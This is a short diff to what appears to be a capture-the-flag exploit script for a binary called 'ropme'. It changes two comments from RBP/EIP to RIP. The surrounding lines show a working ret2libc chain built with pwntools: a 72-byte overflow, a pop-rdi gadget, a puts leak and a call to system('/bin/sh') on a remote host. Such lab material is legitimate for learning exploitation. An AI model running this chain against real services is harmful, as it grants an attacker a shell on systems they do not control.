@@ -345,7 +345,7 @@ p = remote(HOST, PORT)
 elf = ELF('./ropme')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-padding = b'A' * 72 # offset to overwrite RBP
+padding = b'A' * 72 # offset to overwrite RIP
 gadget = 0x4006d3 # pop rdi ; ret
 puts_plt = elf.plt['puts'] # 0x4004e0 (plt in GEF)
 puts_got = elf.got['puts'] # 0x601018 (got in GEF)
@@ -381,7 +381,7 @@ log.info('/bin/sh at ' + hex(binsh))
 p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld
 
 pld = b''
-pld += padding # offset to go save EIP 
+pld += padding # offset to go save RIP 
 pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
 pld += p64(binsh) # 
 pld += p64(addr_system)
